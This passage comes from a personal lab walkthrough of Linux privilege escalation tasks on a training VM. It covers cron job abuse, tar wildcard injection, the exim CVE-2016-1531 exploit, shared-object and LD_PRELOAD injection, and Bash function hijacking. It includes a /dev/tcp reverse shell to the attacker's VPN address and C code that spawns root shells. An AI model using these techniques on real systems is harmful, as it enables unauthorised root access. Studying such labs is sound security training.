+* * * * * root /usr/local/bin/compress.sh</code></pre><p id="8816d87c-078f-4fed-a59c-65f98ef6821d" class="">There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.</p><p id="8b9ecea5-b9eb-41fd-88d7-10b2ee404dfb" class="">Locate the full path of the overwrite.sh file:</p><p id="df6c05e4-3895-42eb-8de7-e89a7f8aa5dc" class=""><code>locate overwrite.sh</code></p><p id="887eafd6-2a9f-4cf1-a006-7f23a63a1fee" class="">Note that the file is world-writable:</p><p id="6da1c6e3-2a38-4ce6-933c-ff614cef530a" class=""><code>ls -l /usr/local/bin/overwrite.sh</code></p><p id="3ca63f4d-2c23-4421-8ea2-1443d31cbd7c" class="">Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.(Atacker box)</p><pre id="31b2f787-4921-4e0e-be2a-1fc2ca118313" class="code"><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/<strong>your Vpn Tunnel ip </strong>/4444 0&gt;&amp;1</code></pre><p id="ee67d326-c746-4f6f-a688-5dcb19c8ff86" class="">Set up a netcat listener on your host machine  on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.</p><p id="d2f18bc3-9074-4761-b439-8a1e69189b6b" class=""><code>nc -nvlp 4444</code></p><p id="8343750d-e927-4b6f-b464-b8e2dde5c866" class="">
+</p><pre id="b8fdc425-989f-4542-a18c-03a7be86d593" class="code"><code>atom@mx:~
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.35.132] from (UNKNOWN) [10.10.91.90] 55336                                        
+bash: no job control in this shell
+root@debian:~#</code></pre><p id="fa71f2c9-4d5c-4596-ab3e-0d2d89c806bd" class="">
+</p><h3 id="9238a31e-f431-4011-9b07-63ac4cd1a4b0" class=""><mark class="highlight-teal">Task 9 Cron Jobs - PATH Environment Variable</mark></h3><p id="d9d927ef-52de-4696-9a20-cb7d3ebfd625" class="">
+</p><p id="22cc3b3c-cc51-48d1-a8fb-ff7d080d604e" class="">The crontab PATH environment variable is by default set to <strong>/usr/bin:/bin</strong></p><p id="94b9e043-3fdf-45c1-b8c1-b9e8e6606230" class="">The PATH variable can be overwritten in the crontab file.</p><p id="6b611803-e8a4-43ce-a080-14dd7f65bf58" class="">if a cron job program/script does not use an absolute path , and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.</p><p id="1226c1ac-1651-4242-89e9-1ef72ac306c3" class="">
+</p><p id="3da5a2ef-73a7-4d50-8342-e8dbb08180ad" class="">View the contents of the system-wide crontab:</p><p id="e21d7a5a-b6ea-4fdb-9888-c449a0f6b5db" class=""><code>cat /etc/crontab</code></p><p id="0f481b58-40d5-48db-ad68-506ab6fb1059" class="">
+</p><p id="703f603d-4e71-49be-9aab-f2cef78dcf88" class="">Note that the PATH variable starts with <strong>/home/user</strong> which is our user&#x27;s home directory. on<code> /etc/crontab</code> file </p><pre id="5e69e1a1-b5b6-42d9-af76-b948b25e40da" class="code"><code>SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binT</code></pre><p id="3682436c-333a-4c7e-92f0-d2993cba145a" class="">Create a file called <strong>overwrite.sh</strong> in your home directory with the following contents:</p><pre id="6d5c2f02-74e4-4685-9b9b-00e4df0ce389" class="code"><code>#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash</code></pre><p id="3601da54-f3bb-4378-9065-4def3615320a" class="">Make sure that the file is executable:</p><p id="032e5317-91ae-4bf4-bc81-8c09e0e267a6" class=""><code>chmod +x /home/user/overwrite.sh</code></p><p id="ae995f1d-b5f0-4a49-9853-81bb0a089df8" class="">Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:</p><p id="b4e882ae-3608-4860-91f6-8906175b4874" class=""><code>/tmp/rootbash -p</code></p><p id="15c7b832-70e5-479b-a5eb-4f921de27936" class="">
+</p><pre id="488a1eaa-9f0a-4d9a-9d31-ea5ecacf7d56" class="code"><code>user@debian:/tmp$ ./rootbash -p
+rootbash-4.1#</code></pre><p id="992fb114-e223-4ceb-8a11-bc3f66d049d2" class="">
+</p><h3 id="543000e6-6e5a-41a5-ae03-cdf5fe97ddf8" class="block-color-teal">Task 10 Cron Jobs - Wildcards</h3><p id="c95498ee-4d84-4ce6-adda-f53c7f7f0f12" class="">
+</p><p id="d6f44807-7333-491d-b0ce-c55af8abfe5e" class="">Cron table files (crontabs) store the configuration for cron jobs . User  crontabs are usually located in /var/spoll.cron/ or /var/spool/cron/crontabs/, The system-wide crontab is locatted at /etc/crontab</p><p id="f7c57f23-5ec8-40f7-84d2-6c8312a60db4" class="">Misconfriguration of file permission asociated with cron jobs can lead to easy privilege escalation.</p><p id="c0027569-733a-4196-b1eb-380474f23261" class="">if we can write to a program or script which gets run as part of cron job, we can replace it with our own code.</p><p id="9a5ca7a5-d6d9-4c5c-9a63-0d651687e6e0" class="">
+</p><p id="7c4dc04c-879e-4b49-a366-5839694c462d" class=""><strong>wildcards </strong>when a wildcard character (*) is provided to command as part of an argument,  the shell will first perform filename expansion(also known as gobbling) on the wildcard.</p><p id="80be0236-a76a-4645-acc9-54903bfc5024" class="">This process replaces the wildcard with a space-separated list of the file and director,</p><p id="d16a4282-6e7f-489f-b84c-4caa0d7da5c5" class=""><strong>wildcard &amp; filenames</strong> since filenames in Linux are generally very permissive with filenames, and filenames expansion happens before(e.g. -h, —help ) to commands by creating files with these names. The following command shows how its work:</p><p id="4047bad6-5581-4b15-aec9-b0bb97d6c687" class=""><code>ls *  </code></p><p id="0a91379b-80e2-4169-a636-9c3d585f06a3" class=""><code>% touch./-1 </code></p><p id="4695a3fa-9acb-4ae5-841d-c9f837a6e14d" class=""><code> ls *</code></p><p id="b07619f9-9242-4002-9d7c-41b7bfd7d6b5" class="">
+</p><pre id="6810dfad-cd99-4de6-8bac-7f15b505692a" class="code"><code>user@debian:~$ cd /etc/crontab 
+-bash: cd: /etc/crontab: Not a directory
+user@debian:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+user@debian:~$
+</code></pre><p id="6f4102f9-b810-4e46-8a61-af593a58bd2d" class="">there is another cronjob is running on /usr/local/bin/compress.sh</p><p id="34a7af79-5940-4c04-9cb7-c93e73b9c48b" class="">ok lets what its contains</p><pre id="7ccbb843-23e8-42f7-95a4-115cf221be4e" class="code"><code>user@debian:~$ cat /usr/local/bin/compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *</code></pre><p id="8e326a4e-2f84-4d91-b729-622e5387c148" class=""><strong>GTFOB </strong>ins shows that <a href="https://gtfobins.github.io/gtfobins/tar/">tar </a>has command line options which can be used to run other commands as part of a checkpoint feature.</p><p id="b875c566-5c25-44b8-803f-7df890d2d4fd" class="">
+</p><figure id="7531a8a1-fc51-48b0-9cda-9300d9471598" class="image"><a href="Linux%20PrivEsc%20fcdba8ac736a4e4697015cbd50a98cbd/Untitled%201.png"><img style="width:945px" src="Linux%20PrivEsc%20fcdba8ac736a4e4697015cbd50a98cbd/Untitled%201.png"/></a></figure><p id="9fef123a-69c0-4a49-9bdf-5149ebfba7d3" class="">so what is checkpoint ?</p><p id="1afc8853-9b2e-4a38-8b31-c225a8ae33dd" class="">A <em>checkpoint</em> is a moment of time before writing nth record to the archive (a <em>write checkpoint</em>), or before reading nth record from the archive (a <em>read checkpoint</em>). Checkpoints allow to periodically execute arbitrary actions.</p><p id="b35307ec-8c99-401a-9a91-00826386cd85" class="">The checkpoint facility is enabled using the following option:</p><p id="2f7a2841-48aa-4fc2-a01e-69380d60524a" class="">`--checkpoint[=n]&#x27;Schedule checkpoints before writing or reading each nth record. The default value for n is 10.</p><p id="fe27adb6-267f-4b2d-bf51-955dfad8271b" class="">A list of arbitrary <em>actions</em> can be executed at each checkpoint. These actions include: pausing, displaying textual messages, and executing arbitrary external programs. Actions are defined using the <code>`--checkpoint-action&#x27;</code> option.</p><p id="3d644fc4-1ea2-450b-9194-849405d15397" class=""><code>`--checkpoint-action=action&#x27; </code>Execute an action at each checkpoint.</p><p id="284bf859-c800-437b-a34a-f001ca142f73" class="">
+</p><pre id="d171adda-e64f-4e2e-ba9e-77a89d413556" class="code"><code>user@debian:~$ echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/user/exe.sh
+user@debian:~$ chmod +X exe.sh 
+user@debian:~$ touch /home/user/--checkpoint=1
+user@debian:~$ touch /home/user/--checkpoint-action=exec=sh\ exe.sh
+user@debian:~$ ls
+--checkpoint=1                     --checkpoint-action=exec=sh exe.sh  myvpn.ovpn  tools
+--checkpoint-action=exec=shell.sh  exe.sh                              shell.sh
+user@debian:~$ /tmp/bash -p
+bash-4.1#</code></pre><h3 id="d9aeaeff-c961-49b7-8fd6-13b357edb699" class=""><mark class="highlight-teal">Task 11 SUID / SGID Executables - Known Exploits</mark></h3><p id="607e18c8-1b4f-4787-9673-ed374746eda8" class="">
+</p><p id="d8fd5347-e8d6-416b-a5de-2295b07fcfd5" class="">Find all the SUID/SGID executables on the Debian VM:</p><p id="c1ff788a-b4c6-401d-8db2-f9e5d6f598bf" class=""><code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code></p><p id="0aa28e3f-e557-4fb1-a393-3b0f55d70d03" class="">Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. <a href="https://www.exploit-db.com/">Exploit-DB</a>, Google, and GitHub are good places to search! A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at <strong>/home/user/tools/suid/exim/cve-2016-1531.sh</strong>.</p><p id="3ee110e8-f179-4d8f-80eb-e0e482fee698" class="">Run the exploit script to gain a root shell:</p><p id="ac2e7268-b36a-4c8c-a643-99018f96b7d2" class=""><code>/home/user/tools/suid/exim/cve-2016-1531.sh</code></p><pre id="4da11e06-ee7e-45bb-b54d-8a3e9479c63e" class="code"><code>user@debian:~/tools/suid/exim$ ls
+cve-2016-1531.sh
+user@debian:~/tools/suid/exim$ cat cve-2016-1531.sh 
+#!/bin/sh
+# CVE-2016-1531 exim &lt;= 4.84-3 local root exploit
+# ===============================================
+# you can write files as root or force a perl module to
+# load by manipulating the perl environment and running
+# exim with the &quot;perl_startup&quot; arguement -ps. 
+#
+# e.g.
+# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
+# [ CVE-2016-1531 local root exploit
+# sh-4.3# id
+# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
+# 
+# -- Hacker Fantastic 
+echo [ CVE-2016-1531 local root exploit
+cat &gt; /tmp/root.pm &lt;&lt; EOF
+package root;
+use strict;
+use warnings;
+
+system(&quot;/bin/sh&quot;);
+EOF
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
+user@debian:~/tools/suid/exim$ ./cve-2016-1531.sh 
+[ CVE-2016-1531 local root exploit
+sh-4.1#</code></pre><p id="a99dbdeb-ca2e-42ad-b457-9fc0395ea3c1" class="">
+</p><p id="eae8bbb6-2749-43d5-854e-4f5d39f06772" class=""><mark class="highlight-teal"><strong>Task 12 SUID / SGID Executables - Shared Object Injection</strong></mark></p><p id="bee22754-8043-4855-8e0c-b1e7bd0a76b7" class="">When a program is executed, it will try to load the shared objects it requires. using a program called <strong>strace,</strong> we can track these system calls and determine whether any shared objects were not found. If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.</p><p id="ab1db8e8-14be-41af-a88f-d7711ea188a6" class=""><strong>Find SUID/SGID files on the target:</strong></p><pre id="c8303de0-e8e4-4b65-bfa3-c52002ac58ab" class="code"><code>user@debian:/usr/local/lib$ find / -type f -perm -u+s 2&gt;/dev/null 
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+<strong>/usr/local/bin/suid-so      &lt;--------------</strong>
+/usr/local/bin/suid-env <strong>              </strong>
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/sbin/mount.nfs</code></pre><p id="28f2dff7-b7c3-4b71-b871-b545fc257a5c" class="">
+</p><p id="de4e37ef-a7b2-44bb-ba1b-b3801385ef7e" class="">The <strong>/usr/local/bin/suid-so</strong> SUID executable is vulnerable to shared object injection. First, execute the file and note that currently it displays a progress bar before exiting:</p><p id="731eb12b-727f-47be-8044-f5761d936c78" class=""><code>/usr/local/bin/suid-so</code></p><pre id="c090df2e-745a-4a28-a6b9-34dafbd32c1b" class="code"><code>user@debian:~$ /usr/local/bin/suid-so
+Calculating something, please wait...
+[=====================================================================&gt;] 99 %
+Done.</code></pre><p id="d024087b-8266-4e3e-8c09-faea53961da7" class="">it is just a progress bar lets dig little bit using command strings (print the printable strings) and strace(used to trace system calls)</p><pre id="4e494ef0-70ef-4675-9966-7a6482d4ac05" class="code"><code>user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3
+open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  &lt;-------------
+user@debian:~$</code></pre><p id="a584525c-4328-465a-8f1b-1a77ffa40ebe" class="">suid-so expecting <a href="http://libcalc.so">libcalc.so</a> in home directory but in home directory there is no file is like libcalc shared object</p><p id="59efd874-121b-45b4-99aa-c9d17233b701" class="">Create the /home/user/.config directory. Create the file libcalc.c with the following contents</p><pre id="e54025a9-2d74-4e55-9cf7-aade1321ce22" class="code"><code>#include &lt;stdio.h&gt; 
+#include &lt;stdlib.h&gt;
+static void inject() __attribute__((constructor));
+void inject() 
+{
+setuid(0);
+system(&quot;/bin/bash -p&quot;);
+}</code></pre><p id="8d2790a9-350b-4d1a-ab98-d0e3550f0f71" class="">It simply spawns a Bash shell. Compile the code into a shared object at the location the <strong>suid-so</strong> executable was looking for it:</p><p id="4dc7b628-a369-462e-bd46-ca2bf1e04ef3" class=""><code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</code></p><p id="02454432-6f70-4a91-aabb-a6e8a0b1916d" class="">
+</p><p id="836f22fa-fe0e-434b-b5bb-ae166c8051de" class="">Run the SUID executable to get a root shell:</p><pre id="39baedf6-6a35-4ce6-99db-156404e8847b" class="code"><code>user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+user@debian:~$ ls
+1  myvpn.ovpn  tools
+user@debian:~$ /usr/local/bin/suid-so 
+Calculating something, please wait...
+bash-4.1#</code></pre><p id="5d38e294-5541-4f80-8c2f-14eb98240f27" class="">
+</p><h3 id="07df0a0f-6f66-4464-9f3d-c5fa93d436ae" class="block-color-teal">Task 13 SUID / SGID Executables - Environment Variables</h3><p id="0c68ec25-db48-4c7e-95d2-1c3280bd3541" class="">
+</p><p id="0d1a54d8-fd46-4112-947e-f05539eb914f" class="">The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user&#x27;s PATH environment variable and attempting to execute programs without specifying an absolute path.</p><p id="dbe310e6-061f-4475-861e-efec3c4335af" class="">To find <strong>SUID</strong> permission<code> find / -type f -perm -u+s 2&gt;/dev/null </code></p><pre id="3cbd2e20-8285-4e06-908e-d1ae476e42d6" class="code"><code>user@debian:/usr/local/lib$ find / -type f -perm -u+s 2&gt;/dev/null 
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+<strong>/usr/local/bin/suid-env                &lt;----------</strong>
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/sbin/mount.nfs</code></pre><p id="16eee951-c1e1-474f-a2c8-7ac837e78be9" class="">The suid-envfile should execute with root user permissions. so lets see what the file contains </p><pre id="c6f81db3-abb3-4929-ab71-1f22862bf9ce" class="code"><code>user@debian:~$ /usr/local/bin/suid-env
+Starting web server: apache2httpd (pid 1403) already running</code></pre><p id="0949b116-4dea-4e96-b49b-5d1f2acf22f3" class="">we fined apache is running  lets see  using <code>strings</code> we can find printable strings while executing suid file </p><p id="34b5b8f3-b647-47a5-88a6-de08533db0dc" class="">  </p><pre id="99076819-08c1-413b-900b-a3e775ae0fb4" class="code"><code>user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start  &lt;---------- hear is intrestig  it uses the Relative path</code></pre><p id="ef587ca9-aee7-4699-a669-63ed0740b109" class="">service is a command and The file could be trying to run the service program without a full path. This reveals that the system function is being used to execute the service it uses the absolute pathprogram.</p><p id="22e19ec1-4f39-4400-9bf3-bdf99369ab3f" class="">lets create malicious shared object file in the name of service</p><p id="a25456bb-ed51-425b-abea-b92e678a4087" class=""> </p><pre id="252abd75-a6ae-4bdb-a76e-2bc3bf12920c" class="code"><code>int main() {
+        setuid(0);
+        system(&quot;/bin/bash -p&quot;);
+}
+
+user@debian:~$ gcc service.c -o service
+user@debian:~$ ls
+myvpn.ovpn  service  service.c  tools</code></pre><p id="7ea8e3ef-6910-4ffa-8e4c-3e26d23deb95" class="">we need to add path to look service command on current directory , it can be done using following command </p><pre id="81cb3a88-0801-404d-8942-4ad4269a8d95" class="code"><code>user@debian:~$ export PATH=.:$PATH
+user@debian:~$ echo $PATH
+.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin</code></pre><p id="aac5f93c-12c0-4189-b401-bc93bcf7a444" class=""><code>.</code> refers to the current directory</p><pre id="f13a83f7-a095-44df-82d6-e52e7d35d23c" class="code"><code>user@debian:~$ /usr/local/bin/suid-env
+root@debian:~#</code></pre><p id="3166e4cb-01e8-45e6-8747-426aaf0e14e7" class="">
+</p><p id="0e079ea2-7b4c-4ccd-ba47-0b5c5f6670da" class=""><strong>we can do this another method  also</strong></p><p id="ef151ea2-f91d-43b4-a49a-334c1fd55527" class="">
+</p><p id="dffbcce5-c1a5-4b87-9ea7-d937efa9b47f" class="">Create a shared object using the code located at /home/user/tools/sudo/preload.c:</p><p id="4c56ada3-9fee-41f3-8d5e-a327d38756bf" class=""><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</code></p><p id="d063bf53-a81c-4d56-bfe8-f2f905a14afd" class="">Run one of the programs you are allowed to run via sudo (listed when running <strong>sudo -l</strong>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:</p><p id="8a8221a8-3380-410d-bec8-73357ee177f6" class=""><code>sudo LD_PRELOAD=/tmp/preload.so apache2</code></p><p id="1ffb48ed-7736-4101-87af-7678834aab5b" class="">
+</p><pre id="6a4855a1-f231-47a9-9886-7fee99425374" class="code"><code>user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so apache2
+root@debian:/home/user#</code></pre><p id="3802d3ce-6046-4fe6-9b7c-f0f3c0338c68" class="">
+</p><p id="5b4e0ff2-92ab-496b-8338-b8636da76464" class=""><mark class="highlight-teal"><strong>Task 14 SUID / SGID Executables - Abusing Shell Features (#1)</strong></mark></p><p id="5d07f772-db9d-476d-9a18-25da50828d5b" class="">
+</p><p id="b8b829c0-3ffc-4862-b074-ace9c08e2dc3" class="">find suid enabled files </p><p id="e94b1109-7821-42ea-967f-487a60d6867f" class="">
+</p><pre id="53f57236-1c3f-4a8b-8efa-67916368cfe6" class="code"><code>user@debian:~$ find / -type f -perm -u+s 2&gt; /dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2       &lt;--------------
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/sbin/mount.nfs
+user@debian:~$</code></pre><p id="a46c2f43-d8e9-4c6f-9b93-6dac9b89fad0" class="">
+</p><p id="ae6d1da3-796f-4a94-9419-935c41429fa8" class="">Verify this with strings:</p><p id="97a4ff1d-2d62-46ed-94ba-08374cf66fd6" class=""><code>strings /usr/local/bin/suid-env2</code>    it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 web Run the suid-env2 executable to gain a root shell:server.</p><p id="da87887c-9ba8-4d81-a806-55d794b4091e" class="">
+</p><pre id="c19e841f-ebe4-4741-ac22-742bfca94019" class="code"><code>user@debian:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start   &lt;------------it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.</code></pre><p id="9adc455c-a08d-4316-a3fa-c67b1fa390d9" class="">
+</p><p id="eef84bda-3e1f-4c28-a885-40636033cd23" class="">In some shells (notably Bash &lt;4.2-048) it is possible to define user functions with an absolute path name.These functions can be exported so that sub processes have access to them, and the functions can take precedence over the actual executable being called</p><p id="05e5709e-cb77-4cb3-8b09-60c9ae6f2b4d" class="">
+</p><p id="9a93130a-8fc5-4157-aa44-5da5b486fe69" class="">The file could be trying to run the /usr/sbin/service program. we can verify using <strong>strace</strong></p><p id="b8f588fa-213d-4142-a16e-116d561c1c49" class="">
+</p><p id="c12cf698-0fec-44a2-ac80-2eed6668ceb7" class=""><code>strace-v -f -e execve/usr/local/bin/suid-env2 2&gt;&amp;1 | grep service</code></p><pre id="64d7decb-6023-4781-acb3-0418512e081d" class="code"><code>user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env2 2&gt;&amp;1 | grep &quot;service&quot;
+[pid  3039] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/service apache2 start&quot;],</code></pre><p id="6f087ee8-2bca-4260-96ea-c5c0740d719f" class="">
+</p><p id="34f1efcf-06a8-41f2-9246-bd2cf8c06958" class="">Verify the version of Bash is lower than 4.2-048:</p><pre id="3c5bb18c-6117-45ff-b1f2-376e18cbd1cf" class="code"><code>user@debian:~$ /bin/bash -version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.</code></pre><p id="eed1264a-80b9-43a4-870c-49700fc7ca1a" class="">
+</p><p id="46895183-c8e0-409a-affe-6580d223217a" class="">Create a Bash function with the name &quot;/usr/sbin/service&quot; that executes a new Bash shell (using -p so permissions are preserved) and export the function: Run the suid-env2 executable to gain a root shell:</p><p id="a16b18ab-8b20-4300-a7d4-989bc90600d2" class="">
+</p><pre id="7b50b4a3-cd1e-43f3-9ced-2962a86ffd8b" class="code"><code>user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
+user@debian:~$ export -f /usr/sbin/service
+
+user@debian:~$ export -f
+/usr/sbin/service ()
+{
+    /bin/bash -p
+}
+declare -fx /usr/sbin/service
+user@debian:~$
+
+user@debian:~$ /usr/local/bin/suid-env2
+root@debian:~#</code></pre><p id="5d78e2e8-906d-448d-8e80-97f134b1a739" class="">
+</p><p id="8e047c65-78ee-4746-a14d-5f0f03231c94" class=""><strong>bash gives first preority to funsctions and shell variables then binaryes (exectuble program i.e service)</strong></p><h3 id="812ce81e-cbd4-4289-828a-7245b0cda294" class=""><mark class="highlight-teal"><strong>Task 15 SUID / SGID Executables - Abusing Shell Features (#2)</strong></mark></h3><p id="c2528248-0868-456f-b622-a0cbe0ce9944" class="">
+</p><p id="0db8066e-b473-4742-9bff-4a826899de33" class="">Bash has a debugging mode which can be enabled with the –x command line option, or by modifying the SHELLOPTSenvironment variable to include xtrace. By default, SHELLOPTS is read only, however the envcommand allows SHELLOPTS to be set.When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.</p><p id="a8e5be96-f38d-4058-9434-96ef66a65bdd" class="">If a SUID file runs another program via Bash (e.g. by using system()) these environment variables can be inherited.If an SUID file is being executed, this command will execute with the privileges of the file owner. in Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.</p><p id="5a00b1f3-82ce-4ee0-8900-7339c8118eab" class="">
+</p><p id="619baebc-2393-4d1f-8294-e0722ffd4c1a" class="">Find SUID/SGID files on the target:</p><p id="3e3da202-206c-475e-ab3f-07ab7fe4e30e" class=""><code>find / -type f -a \( -perm -u+s-o -perm -g+s\) -exec ls -l {} \; 2&gt; /dev/null</code></p><p id="cd5cb50e-d542-4592-86d8-14f13bc65a1a" class="">
+</p><p id="78fe7d58-a7bd-4501-8319-392088115289" class="">Note: This will not work on Bash versions 4.4 and above.</p><p id="feee29ed-c460-47f7-ac8e-02ae51b0bdb5" class="">
+</p><p id="62f1b9ba-8c30-4f31-97d5-eb112ee06899" class="">any binary running command with SHELLOPTS=xtrace it will run as a debugging mode  output will be large </p><pre id="b963e72b-f0eb-4ae3-948b-f42e196e2689" class="code"><code>user@debian:~$ env -i SHELLOPTS=xtrace /usr/local/bin/suid-env2                                                                                                                                               
++ /usr/sbin/service apache2 start
+++ basename /usr/sbin/service
++ VERSION=&#x27;service ver. 0.91-ubuntu1&#x27;
+++ basename /usr/sbin/service
++ USAGE=&#x27;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#x27;
++ SERVICE=
++ ACTION=
++ SERVICEDIR=/etc/init.d
++ OPTIONS=
++ &#x27;[&#x27; 2 -eq 0 &#x27;]&#x27;
++ cd /
++ &#x27;[&#x27; 2 -gt 0 &#x27;]&#x27;
++ case &quot;${1}&quot; in
++ &#x27;[&#x27; -z &#x27;&#x27; -a 2 -eq 1 -a apache2 = --status-all &#x27;]&#x27;
++ &#x27;[&#x27; 2 -eq 2 -a start = --full-restart &#x27;]&#x27;
++ &#x27;[&#x27; -z &#x27;&#x27; &#x27;]&#x27;
++ SERVICE=apache2
++ shift
++ &#x27;[&#x27; 1 -gt 0 &#x27;]&#x27;
++ case &quot;${1}&quot; in
++ &#x27;[&#x27; -z apache2 -a 1 -eq 1 -a start = --status-all &#x27;]&#x27;
++ &#x27;[&#x27; 1 -eq 2 -a &#x27;&#x27; = --full-restart &#x27;]&#x27;
++ &#x27;[&#x27; -z apache2 &#x27;]&#x27;
++ &#x27;[&#x27; -z &#x27;&#x27; &#x27;]&#x27;
++ ACTION=start
++ shift
++ &#x27;[&#x27; 0 -gt 0 &#x27;]&#x27;
++ &#x27;[&#x27; -r /etc/init/apache2.conf &#x27;]&#x27;
++ &#x27;[&#x27; -x /etc/init.d/apache2 &#x27;]&#x27;
++ exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start                                                                                     
